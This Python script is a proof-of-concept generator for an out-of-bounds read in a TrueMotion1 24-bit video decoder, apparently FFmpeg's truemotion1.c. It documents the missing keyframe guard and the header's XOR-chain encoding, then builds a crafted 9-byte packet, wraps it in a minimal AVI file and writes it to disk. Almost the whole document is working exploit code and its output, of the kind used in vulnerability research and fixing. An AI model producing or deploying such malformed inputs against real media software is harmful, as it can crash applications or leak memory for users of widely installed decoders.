#!/usr/bin/env python3
"""
VULN 002 PoC generator — truemotion1_decode_24bit() missing keyframe guard.

Bug (truemotion1.c line 783):
  The 24-bit decoder unconditionally reads mb_change_bits on every row:
      mb_change_byte = mb_change_bits[mb_change_index++];
  The 16-bit decoder guards this with:
      if (!keyframe) mb_change_byte = mb_change_bits[mb_change_index++];

For a 24-bit keyframe mb_change_bits aliases the index stream.  After every 4
rows the pointer advances by mb_change_bits_row_size, walking past valid data.
With a minimal packet the pointer exceeds the allocated buffer.

Header decode in truemotion1_decode_header() (lines 320–346):
  header_size = ((buf[0] >> 5) | (buf[0] << 3)) & 0x7f   [bit-rotate]
  for i in 1..header_size-1:
      header_buffer[i-1] = buf[i] ^ buf[i+1]              [XOR chain]
  compression  = header_buffer[0]
  deltaset     = header_buffer[1]
  vectable     = header_buffer[2]
  ysize        = LE16(header_buffer[3:5])
  xsize        = LE16(header_buffer[5:7])
  version      = header_buffer[9]   (0 → FLAG_KEYFRAME unconditionally)

The XOR chain reads up to buf[header_size], so buf[header_size] is the last
header-relevant byte AND the start of the index/mb_change_bits data.
"""

import struct
import os

# ---------------------------------------------------------------------------
# Utility: find buf[0] that encodes a given header_size
# ---------------------------------------------------------------------------

def header_size_byte(desired_hs):
    """Return a buf[0] >= 0x10 that decodes to desired_hs."""
    for b in range(0x10, 0x100):
        val = ((b >> 5) | ((b << 3) & 0xFF)) & 0x7F
        if val == desired_hs:
            return b
    raise ValueError(f"No valid buf[0] for header_size={desired_hs}")


# ---------------------------------------------------------------------------
# Build a TrueMotion1 packet via the XOR chain
# ---------------------------------------------------------------------------

def build_tm1_packet(compression, deltaset, vectable, xsize, ysize):
    """
    Build the minimal TM1 keyframe packet (header_size bytes + 1 data byte).

    The XOR chain for header_size=8:
      raw[1] = 0x00   (arbitrary seed)
      raw[k+2] = raw[k+1] ^ desired[k]  for k in 0..6

    Decoded fields from the chain:
      header_buffer[k] = raw[k+1] ^ raw[k+2] = desired[k]

    Packet length = header_size + 1 = 9 bytes.
    raw[header_size] = raw[8] is computed by the chain (it's desired[6]=xsize_hi
    XOR'd with raw[7]), and it ALSO serves as index_stream[0] — that's fine,
    the decoder re-reads it as an index byte.
    """
    HEADER_SIZE = 8
    buf0 = header_size_byte(HEADER_SIZE)

    # Desired decoded values (7 for HEADER_SIZE=8, i.e. chain produces buf[2..8])
    desired = [
        compression & 0xFF,
        deltaset    & 0xFF,
        vectable    & 0xFF,
        ysize & 0xFF,            # ysize_lo
        (ysize >> 8) & 0xFF,     # ysize_hi
        xsize & 0xFF,            # xsize_lo
        (xsize >> 8) & 0xFF,     # xsize_hi
    ]
    # Only 7 fields fit in the loop (i=1..7 → header_buffer[0..6])
    # header_buffer[7..12] are all zero (uninitialized header_buffer[128]={0})
    # → version=0 < 2 → FLAG_KEYFRAME always set.

    # Build raw bytes via XOR chain.
    # Packet = buf[0..HEADER_SIZE] inclusive = HEADER_SIZE+1 = 9 bytes.
    raw = bytearray(HEADER_SIZE + 1)
    raw[0] = buf0
    raw[1] = 0x00  # XOR seed
    for k, d in enumerate(desired):
        raw[k + 2] = raw[k + 1] ^ d

    # Verify
    hs = ((raw[0] >> 5) | ((raw[0] << 3) & 0xFF)) & 0x7F
    assert hs == HEADER_SIZE, f"header_size={hs} != {HEADER_SIZE}"
    hb = [0] * 128
    for i in range(1, HEADER_SIZE):
        hb[i - 1] = raw[i] ^ raw[i + 1]
    assert hb[0] == compression, f"compression={hb[0]} != {compression}"
    assert hb[5] | (hb[6] << 8) == xsize, f"xsize mismatch"
    assert hb[3] | (hb[4] << 8) == ysize, f"ysize mismatch"

    return bytes(raw), HEADER_SIZE


# ---------------------------------------------------------------------------
# Minimal AVI container
# ---------------------------------------------------------------------------

def pack_chunk(fourcc, data):
    if isinstance(fourcc, str):
        fourcc = fourcc.encode()
    return fourcc + struct.pack('<I', len(data)) + data


def pack_list(listtype, inner_data):
    if isinstance(listtype, str):
        listtype = listtype.encode()
    payload = listtype + inner_data
    return b'LIST' + struct.pack('<I', len(payload)) + payload


def build_avi(display_width, display_height, video_data):
    """Minimal RIFF AVI with one video stream and one frame."""

    # --- avih (AVIMainHeader, 56 bytes) ---
    avih = struct.pack('<IIIIIIIIII4I',
        1_000_000,          # microseconds per frame (1 fps)
        0,                  # max bytes per second
        0,                  # padding granularity
        0,                  # flags
        1,                  # total frames
        0,                  # initial frames
        1,                  # streams
        len(video_data) + 8,# suggested buffer size
        display_width,      # width
        display_height,     # height
        0, 0, 0, 0          # reserved[4]
    )
    # struct: 10×I + 4×I = 14 × 4 = 56 bytes ✓

    # --- strh (AVIStreamHeader, 56 bytes) ---
    # fccType(4) fccHandler(4) dwFlags(4) wPriority(2) wLanguage(2)
    # dwInitialFrames(4) dwScale(4) dwRate(4) dwStart(4) dwLength(4)
    # dwSuggestedBufferSize(4) dwQuality(4) dwSampleSize(4)
    # rcFrame: left(2) top(2) right(2) bottom(2)   → 8 bytes
    # Total = 4+4+4+2+2+4+4+4+4+4+4+4+4+8 = 56 bytes
    strh = struct.pack('<4s4sIHHIIIIIIiI4H',
        b'vids',                    # fccType
        b'DUCK',                    # fccHandler (TrueMotion1)
        0,                          # dwFlags
        0,                          # wPriority
        0,                          # wLanguage
        0,                          # dwInitialFrames
        1,                          # dwScale
        1,                          # dwRate (1 fps)
        0,                          # dwStart
        1,                          # dwLength (1 frame)
        len(video_data) + 8,        # dwSuggestedBufferSize
        -1,                         # dwQuality (signed -1 = 0xFFFFFFFF)
        0,                          # dwSampleSize
        0, 0, display_width, display_height  # rcFrame
    )
    assert len(strh) == 56, f"strh is {len(strh)} bytes, expected 56"

    # --- strf (BITMAPINFOHEADER, 40 bytes) ---
    strf = struct.pack('<IiiHHIiiiII',
        40,                     # biSize
        display_width,          # biWidth
        display_height,         # biHeight (positive = bottom-up)
        1,                      # biPlanes
        24,                     # biBitCount
        0x4B435544,             # biCompression = 'DUCK'
        display_width * display_height * 3,  # biSizeImage
        0,                      # biXPelsPerMeter
        0,                      # biYPelsPerMeter
        0,                      # biClrUsed
        0                       # biClrImportant
    )
    assert len(strf) == 40, f"strf is {len(strf)} bytes, expected 40"

    strl  = pack_list('strl', pack_chunk('strh', strh) + pack_chunk('strf', strf))
    hdrl  = pack_list('hdrl', pack_chunk('avih', avih) + strl)
    movi  = pack_list('movi', pack_chunk('00dc', video_data))

    riff_body = b'AVI ' + hdrl + movi
    return b'RIFF' + struct.pack('<I', len(riff_body)) + riff_body


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_002_input.avi')

    # Trigger parameters:
    #   compression=10 → ALGO_RGB24H (24-bit), BLOCK_4x4, block_width=4
    #   xsize=4        → avctx_width = 4>>1 = 2  (width_shift=1 for 24-bit)
    #   ysize=4        → height = 4
    #
    # Validity checks that must pass:
    #   (1) buf[0] >= 0x10                          ✓ (0x11 >= 0x10)
    #   (2) header_size + 1 <= s->size              ✓ (9 <= 9)
    #   (3) compression in [0,16]                   ✓ (10)
    #   (4) vectable in [1,3]  (compression&1=0)    ✓ (1)
    #   (5) avctx_width even (xsize>>1 even)        ✓ (2 is even)
    #   (6) height % 4 == 0                         ✓ (4 % 4 == 0)
    #   (7) avctx_width*height/2048 + hs <= s->size ✓ (0+8=8 <= 9)
    #
    # Bug path:
    #   truemotion1_decode_24bit() line 783 reads mb_change_bits[0] per row.
    #   mb_change_bits = s->buf + header_size = s->buf + 8  (1 byte available).
    #   For keyframes, mb_change_bits == index_stream (same pointer).
    #   After y=3 the pointer advances by mb_change_bits_row_size=1; subsequent
    #   rows would read s->buf[9], which is past the 9-byte packet → OOB.
    #   (The 16-bit decoder avoids this with an explicit keyframe guard.)

    pkt, hs = build_tm1_packet(
        compression=10,
        deltaset=0,
        vectable=1,
        xsize=4,
        ysize=4,
    )

    print(f"[*] TM1 packet ({len(pkt)} bytes): {pkt.hex()}")
    print(f"[*] header_size = {hs}")

    # Re-decode to confirm
    hb = [0] * 128
    for i in range(1, hs):
        hb[i - 1] = pkt[i] ^ pkt[i + 1]
    avctx_w = (hb[5] | (hb[6] << 8)) >> 1
    height   =  hb[3] | (hb[4] << 8)
    print(f"[*] compression = {hb[0]}  (10=ALGO_RGB24H)")
    print(f"[*] vectable    = {hb[2]}")
    print(f"[*] xsize (raw) = {hb[5] | (hb[6] << 8)},  avctx_width = {avctx_w}")
    print(f"[*] ysize       = {height}  (height)")
    mb_row = ((avctx_w >> 1) + 7) >> 3
    print(f"[*] mb_change_bits_row_size = {mb_row}")
    print(f"[*] s->mb_change_bits = s->buf + {hs}  (= pkt[{hs}] = {pkt[hs]:#04x})")
    print(f"[*] index_stream_size = {len(pkt)} - {hs} = {len(pkt) - hs}")
    print()
    print(f"[*] BUG: line 783 reads mb_change_bits[0] for every row unconditionally.")
    print(f"[*]      After y=3 the pointer advances by {mb_row} past the packet end.")
    print(f"[*]      The 16-bit decoder (line 656) guards with: if (!keyframe) ...")

    # AVI dimensions match the raw xsize/ysize from the TM1 header
    raw_xsize = hb[5] | (hb[6] << 8)
    raw_ysize = hb[3] | (hb[4] << 8)
    avi = build_avi(raw_xsize, raw_ysize, pkt)
    with open(out_path, 'wb') as f:
        f.write(avi)
    print(f"\n[+] Written {len(avi)} bytes to {out_path}")


if __name__ == '__main__':
    main()
